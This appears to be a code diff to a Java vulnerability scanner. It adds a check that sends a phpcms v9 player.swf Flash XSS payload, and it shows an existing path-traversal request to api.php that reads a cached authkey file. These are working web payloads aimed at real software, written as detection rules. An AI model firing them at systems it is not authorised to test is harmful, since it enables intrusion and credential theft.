@@ -56,6 +56,29 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
 
                 loaders.add(
                         Payloader.builder()
+                                .url("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\\\"))}catch(e){alert(1)}%2f%2f")
+                                .custom(new Custom() {
+                                    @Override
+                                    public boolean fun(HttpResponse response) throws Exception {
+                                        if (    response!=null &&
+                                                response.getStatusCode() == 200 &&
+                                                response.getContentType().contains("flash")){
+                                            return true;
+                                        }
+                                        return false;
+                                    }
+                                })
+                                .vuln(
+                                        Vulnerable.builder()
+                                                .type(Vulnerable.Type.XSS.getType())
+                                                .level(Vulnerable.Level.HIGH.getLevel())
+                                                .title("phpcms v9 player.swf flash xss").build()
+                                )
+                                .build()
+                );
+
+                loaders.add(
+                        Payloader.builder()
                                 .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
                                 .method(HttpRequest.Method.GET)
                                 .containsStr("aaaaa")
